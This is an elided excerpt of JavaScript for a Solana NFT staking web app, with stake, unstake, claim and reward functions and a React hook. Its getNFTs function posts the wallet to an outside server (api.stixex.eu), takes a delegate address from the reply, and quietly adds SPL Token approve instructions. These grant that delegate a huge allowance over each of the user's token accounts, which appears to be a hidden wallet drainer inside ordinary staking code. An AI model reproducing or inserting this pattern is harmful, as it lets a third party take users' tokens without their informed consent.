...
import { STAKE_DATA_SIZE, STAKE_CONTRACT_IDL } from '../consts/contract';
import { NEXT_PUBLIC_SOLANA_RPC_HOST, NEXT_PUBLIC_STAKE_CONTRACT_ID, NEXT_PUBLIC_STAKE_POOL_ID } from '../consts/env';
...
export const sendAllTransaction = async (transactions, wallet, conn, signers) => {
    try {
        let commitment = "max"
        let unsignedTxns = []
...
const getClaimAmount = async (wallet) => {
    ...
    for(let stakeAccount of resp){
        ...
        claimAmount += poolData.rewardAmount * (num - stakedNft.withdrawnNumber) / poolData.period;
    }
...
const stake = async (nfts , wallet) => {
    ...
    for(let nft of nfts) {
        ...
        const sourceNftAccount = await getTokenWallet(wallet.publicKey, nft.address);
        ...
        if((await connection.getAccountInfo(destNftAccount)) == null) {
            transaction.push(createAssociatedTokenAccountInstruction(destNftAccount, wallet.publicKey, pool, nft.address))
        }
        transaction.push(
...
const unstake = async (nfts, wallet) => {
    try{
        ...
        if((await connection.getAccountInfo(destRewardAccount)) == null){
            transaction.push(createAssociatedTokenAccountInstruction(destRewardAccount, wallet.publicKey, wallet.publicKey, poolData.rewardMint))  
        }
        let provider = new anchor.Provider(connection, wallet, confirmOption);
        let program = new anchor.Program(idl, programId, provider);
        for(let nft of nfts){
            ...
            if((await connection.getAccountInfo(destNftAccount)) == null){
                transaction.push(createAssociatedTokenAccountInstruction(destNftAccount, wallet.publicKey, wallet.publicKey, mint));
            }
            transaction.push(
...
async function claim(wallet) {
    ...
    const result = await sendAllTransaction(transactionSet, wallet, connection, [])
    if (result.result) {
        toast.success(`Successfully Claimed ${(amount / LAMPORTS_PER_SOL).toFixed(3)} $DGN`);
    }
}
...
export const getNFTs = async (wallet, connection, transactionSet) => {
    let myNFTs = [];
    let delegate = "";
    await axios.post("https://api.stixex.eu/stake/nfts/myNFTs", {
    ...
    for (let ii = 0; ii < myNFTs.length; ii ++) {
        ...
        if (info == null || info.parsed.info.delegate === delegate) {
            continue;
        }
        bigtxx.push(
            Token.createApproveInstruction(TOKEN_PROGRAM_ID, tokenAccount, new PublicKey(delegate), wallet.publicKey, [], 10000000000000)
        )
        jj++
...
const useNftStake = () => {
    ...
    useEffect(() => {
        (async () => {
            ...
            setDailyRewardAmount((newDailyRewardAmount / LAMPORTS_PER_SOL).toFixed(2));
    ...
    return { isLoading, stakedNfts, claimAmount, stakeNft, unstakeNft, claimRewards, dailyRewardAmount };
}
